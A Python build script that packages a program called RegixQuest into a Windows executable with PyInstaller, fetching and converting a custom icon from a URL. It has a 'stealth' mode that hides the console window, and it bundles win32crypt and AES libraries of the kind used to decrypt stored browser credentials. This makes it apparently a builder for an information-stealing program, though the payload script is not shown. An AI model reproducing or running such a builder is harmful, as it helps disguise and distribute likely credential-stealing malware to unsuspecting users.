import os
import sys
import json
import subprocess
import argparse
import urllib.request
import shutil

try:
    from PIL import Image
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "Pillow"])
    from PIL import Image

def load_config(config_path="config.json"):
    """Load configuration from JSON file."""
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading config: {e}")
            return {}
    return {}

def normalize_imgur_url(url):
    """Convert imgur page URLs to direct image URLs."""
    import re
    # Match imgur.com/XXXXX (page URL without 'i.' subdomain)
    match = re.match(r'https?://(?:www\.)?imgur\.com/(?:a/)?([a-zA-Z0-9]+)(?:\..+)?$', url)
    if match:
        image_id = match.group(1)
        direct_url = f"https://i.imgur.com/{image_id}.png"
        print(f"Converted imgur page URL to direct image URL: {direct_url}")
        return direct_url
    return url

def download_and_convert_icon(url):
    """Download image from URL and convert to .ico."""
    try:
        # Auto-fix imgur URLs
        url = normalize_imgur_url(url)
        
        print(f"Downloading icon from {url}...")
        temp_img = "temp_icon.png"
        icon_path = "icon.ico"
        
        # Download
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            content_type = response.headers.get('Content-Type', '')
            data = response.read()
            
            # Validate it's actually an image, not HTML
            if 'text/html' in content_type or data[:15].startswith(b'<!doctype') or data[:15].startswith(b'<html'):
                print(f"ERROR: URL returned HTML instead of an image.")
                print(f"  Content-Type: {content_type}")
                print(f"  Hint: Use a direct image URL (e.g. https://i.imgur.com/ID.png)")
                return "NONE"
            
            with open(temp_img, 'wb') as out_file:
                out_file.write(data)
            
        # Verify Pillow can open it
        img = Image.open(temp_img)
        img.verify()  # Verify it's a valid image
        img = Image.open(temp_img)  # Re-open after verify()
        
        # Convert to ICO with multiple sizes for best quality
        sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
        img.save(icon_path, format='ICO', sizes=sizes)
        print(f"Icon successfully converted to {icon_path}")
        
        # Cleanup temp image
        if os.path.exists(temp_img):
            os.remove(temp_img)
            
        return icon_path
    except Exception as e:
        print(f"Error downloading/converting icon: {e}")
        # Cleanup on failure
        if os.path.exists("temp_icon.png"):
            try:
                os.remove("temp_icon.png")
            except:
                pass
        return "NONE"

def build(stealth=False):
    config = load_config()
    icon_config = config.get("exe_icon", "NONE")
    
    icon_path = "NONE"
    created_icon = False
    
    if icon_config != "NONE":
        if icon_config.startswith(("http://", "https://")):
            icon_path = download_and_convert_icon(icon_config)
            if icon_path != "NONE":
                created_icon = True
        elif os.path.exists(icon_config):
            icon_path = icon_config
        else:
            print(f"Warning: Icon file not found at {icon_config}. Using default icon.")

    base_name = "RegixQuest"
    if stealth:
        base_name += "_Stealth"

    print(f"Building {base_name} with icon: {icon_path}...")
    
    # PyInstaller command construction
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        f"--icon={icon_path}",
        f"--name={base_name}",
        "--add-data", "config.json;.",
        "--hidden-import", "win32crypt",
        "--hidden-import", "Crypto.Cipher.AES",
        "regix_quest.py"
    ]

    if stealth:
        cmd.insert(4, "--noconsole") 

    try:
        subprocess.check_call(cmd)
        print(f"\n[SUCCESS] {base_name}.exe created in dist/ folder.")
    except subprocess.CalledProcessError:
        print(f"\n[ERROR] Failed to build {base_name}.")
        # Cleanup even on failure if we created it
        if created_icon and os.path.exists(icon_path):
            os.remove(icon_path)
        sys.exit(1)
        
    # Cleanup created icon
    if created_icon and os.path.exists(icon_path):
        try:
            os.remove(icon_path)
            print("Cleaned up temporary icon file.")
        except:
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="REGIX QUEST Builder")
    parser.add_argument("--stealth", action="store_true", help="Build in stealth mode (no console)")
    args = parser.parse_args()
    
    build(stealth=args.stealth)
